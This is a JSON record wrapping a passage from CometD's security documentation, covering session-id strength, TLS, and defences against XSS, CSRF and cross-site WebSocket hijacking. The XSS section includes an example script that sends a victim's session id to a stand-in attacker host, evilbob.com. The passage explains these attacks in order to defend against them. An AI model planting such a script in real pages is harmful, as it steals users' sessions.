{
    "criteria": [
        {
            "criterion": "AllDocuments",
            "passed": true,
            "reason": "All documents pass."
        },
        {
            "criterion": "Domain",
            "passed": false,
            "reason": "Document source unavailable."
        },
        {
            "criterion": "QuestionAnswerStrings",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "QuestionAnswerStringsV2",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "FullyStructured",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamStrings",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamStringsV2",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamplesStrings",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ListPrefix",
            "passed": false,
            "reason": "Found 0 list prefixes. (Min: 5)"
        },
        {
            "criterion": "ListPrefixV2",
            "passed": true,
            "reason": "Text contains ['-', '-', '-', '-', '-', '-', '-', '-', '-', '-']."
        },
        {
            "criterion": "ExamplesMinimalEmbed",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamplesSynonymsEmbed",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamplesDiverseEmbed",
            "passed": false,
            "reason": "Does not meet criterion."
        }
    ],
    "doc_id": "5463",
    "text": "\n[[_security]]\n== Security\n\nThis session discusses the security features of the Bayeux Protocol and the\nrelationship with common attacks and how you can configure CometD to tighten\nyour application.\n\n=== Security of the CometD session id\n\nThe Bayeux Protocol identifies a particular session (formerly known as \"client\")\nvia a session id token, carried in Bayeux messages by the `clientId` field.\nThe `clientId` field value (i.e. the session id) is generated by the server\nwhen the client sends the handshake request message, and sent back to the\nclient in the handshake response message (see\nxref:_bayeux_meta_handshake[the Bayeux Protocol handshake]).\nThe client then sends the `clientId` field in every subsequent message to the\nserver, until disconnection.\n\nThe session id is generated using a strong random number generator, and as\nsuch it is not guessable by an evil third party.\nAn evil user that knows its own session id cannot guess the session id of\nanother user by just looking at its own session id.\n\nWhile the non-guessability of the session id is a good starting point, it\nis typically not enough, so read on.\n\n=== Security against man-in-the-middle attacks\n\nAn evil user may be in the position to observe Bayeux Protocol traffic, as\nit is the case for a man-in-the-middle.\n\nThe typical solution in this case is to encrypt the traffic between the\nclient and the server using TLS.\nIn this way, all the traffic between the client and the server is\nencrypted end-to-end and a man-in-the-middle cannot look or otherwise retrieve\nsomeone else's session id.\n\n[[_security_xss]]\n=== Security against Cross-Site Scripting (XSS) attacks\n\nA https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)[cross-site scripting attack]\nis a particularly important vulnerability of web applications.\n\nA typical example of XSS is the following:\n\nEvil user Bob connects to a chat service that uses CometD.\nThere, he finds Alice, another user.\nBob sends an evil chat message text to Alice where the text is the following:\n\n====\n[source,html]\n----\n<script type=\"text/javascript\">\nvar xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"https://evilbob.com?stolen=\" + $.cometd.getClientId());\nxhr.send();\n</script>\n----\n====\n\nAs you can see, the script accesses the CometD's session id (via\n`$.cometd.getClientId()`).\n\n[NOTE]\n====\nRemoving the method `getClientId()` would not solve the issue, because\nthe evil script could access the session id in other ways.\nFor example, by registering an extension, or by otherwise watching\nBayeux messages that come and go for the normal functioning of the\napplication, or by quickly disconnecting and reconnecting the session, etc.\n====\n\nBob sends that evil message, which reaches the CometD server and gets routed\nto Alice. When it arrives on Alice's browser, that script may be run by\nthe browser if the application is XSS vulnerable.\n\nIf the script runs, Bob would be able to steal Alice's session id, send\nit to his server `evilbob.com`, where Bob would be able to access it.\n\n[IMPORTANT]\n====\nIf your web application is XSS vulnerable, an attacker can do\na lot more damage than just stealing a CometD session id, so it is of\nparamount importance that your web application sanitizes data received\nfrom unknown sources such as other users chat messages.\n====\n\nIf Bob has stolen Alice's session id, he could craft a Bayeux message\nwith Alice's session id and send it from his computer, and thereby could\nimpersonate Alice.\n\nCometD protects from impersonations due to stolen session ids in different\nways, depending on the type of transport used to carry Bayeux messages.\n\nFor transports based on HTTP (`long-polling` and `callback-polling`),\nCometD sends a HTTP cookie with the handshake response, marked as `HttpOnly`,\ncalled `BAYEUX_BROWSER` (see xref:_java_server_configuration[]).\nThe CometD implementation, on the server, maps this cookie to a legit\nsession id during the processing of the handshake request message.\nFor every subsequent message, the browser will send the `BAYEUX_BROWSER`\ncookie to the server and the CometD implementation will\nretrieve the session id from legit sessions that have been mapped to the\ncookie, rather than from the message (where it could have been altered).\n\nBob could craft a message with Alice's session id, but the `BAYEUX_BROWSER`\ncookie that he will send along with the tampered message will be his,\nnot Alice's. The CometD implementation will detect this attack and ask\nBob to re-handshake.\n\nIf the crafted message does not have any cookie, CometD will ask Bob to\nre-handshake.\n\nFor transports based on WebSocket (`websocket`), CometD trusts the particular\nconnection that has been established during the handshake.\nThe session id is associated to that connection and when a WebSocket message\narrives on that connection, and CometD retrieves the session id from the\nassociation with the connection, rather than from the message (where it\ncould have been altered).\n\nWhen the connection is closed, for example for a network failure, CometD\nattempts to open another connection.\nIf the reconnection happens within a short period of time (typically less than\nthe `maxInterval` configured on the server), then CometD will try to send\nmessages on the new connection without re-handshaking, but since it's a new\nconnection that did not process a handshake message, it will not have a\nsession id associated.\n\nAt this point, CometD could ask the client to re-handshake (which involves\nsome round-trips to be completed, possibly slowing further down the\ncommunication in case of faulty networks), or it could trust the session\nid from the message (which would yield faster reconnections, albeit less\nsecure if the session id is stolen).\nThis is controlled by the `requireHandshakePerConnection` parameter, see\nxref:_java_server_configuration[].\n\n[[_security_csrf]]\n=== Security against Cross Site Request Forgery (CSRF) attacks\n\nA https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)[cross site request forgery attack]\nis a particularly important vulnerability of web applications.\n\nA typical example of CSRF is the following:\n\nEvil user Bob connects to the chat service at `cometd-chat.com` using CometD. There,\nhe finds Alice, another user. Bob sends an evil chat message text to Alice where the\ntext is the following:\n\n====\n[source,html]\n----\nLook at this: https://evilbob.com/cometd\n----\n====\n\nAlice clicks on the link, her browser opens a new tab to `+https://evilbob.com/cometd+`\nand an entertaining HTML page containing a script is downloaded to Alice's browser.\n\nWhile Alice is looking at Bob's entertaining page, her browser runs an evil script,\nwhich may perform actions on behalf of Alice on the chat service that uses CometD.\n\nFor example, Bob could use xref:_security_xss[XSS] to steal Alice's session id and\nthen craft and send evil messages to the chat service _from Alice's browser_.\nAlice's browser will send the existing Alice's `BAYEUX_BROWSER` cookie along with\nthe evil messages, and to the server the evil messages will be indistinguishable\nfrom legit messages sent by Alice, because they will carry her `BAYEUX_BROWSER`\ncookie and her stolen session id.\n\nCometD does not automatically protects against CSRF attacks, but these are easily\ncounterfeit by configuring the cross-origin filter as explained in\nxref:_java_server_configuration_advanced[this section].\n\nAlice's legit messages are sent by a script downloaded from the chat service, and\ntherefore will have the following HTTP header:\n\n====\n[source]\n----\nOrigin: https://cometd-chat.com\n----\n====\n\nConversely, Bob's evil script is downloaded from `+https://evilbob.com+` and his\nevil messages will have the following HTTP header:\n\n====\n[source]\n----\nOrigin: https://evilbob.com\n----\n====\n\nThe application at `cometd-chat.com` can install the cross-origin filter and\nconfigure it to allow requests only from the `cometd-chat.com` origin,\neffectively blocking Bob's CSRF attack.\nThis works because browsers are required to perform a _preflight_ request\nbefore sending a HTTP request to a different target origin.\nThe preflight request will be intercepted by the cross-origin filter and\ndenied.\nThe unsuccessful preflight response instructs the browser that the script\ncannot perform any request to that target origin, and the browser will\nblock the script from making requests to the target domain.\n\n[[_security_cswsh]]\n=== Security against Cross-Site WebSocket Hijacking (CSWSH) attacks\n\nCross-Site WebSocket Hijacking (CSWSH) is a variant of\nxref:_security_csrf[Cross-Site Request Forgery] but for the WebSocket protocol.\n\nSimilarly to CSRF, Bob tricks Alice to look at a page at\n`+https://evilbob.com/cometd+` that downloads an evil script that opens a\nWebSocket connection to `+https://cometd-chat.com+` _from Alice's browser_.\n\nA WebSocket connection sends an initial HTTP request to the server.\nThis initial HTTP request, triggered by Bob's evil script running in Alice's\nbrowser, looks like this:\n\n====\n[source]\n----\nGET /cometd HTTP/1.1\nUpgrade: websocket\n...\nCookie: BAYEUX_BROWSER=...; JSESSIONID=...\n...\nOrigin: https://evilbob.com\n----\n====\n\nThe initial HTTP request will have Alice's cookies (and possibly Alice's\nauthentication headers), including the CometD cookie and the HTTP session\ncookie.\nHowever, it will have `+Origin: https://evilbob.com+` and not the expected\n`+Origin: https://cometd-chat.com+`.\n\nAs with the CSRF attack, the application at `cometd-chat.com` can install the\ncross-origin filter and configure it to allow requests only from the\n`cometd-chat.com` origin, effectively blocking Bob's CSWSH attack.\n\nIn this case, the cross-origin filter must be installed _before_ the\nWebSocket upgrade mechanism takes place, or the WebSocket upgrade mechanism\nmust have a way to test against a configured list of allowed origins and\nreject the WebSocket connection attempt if the origin is not allowed.\n"
}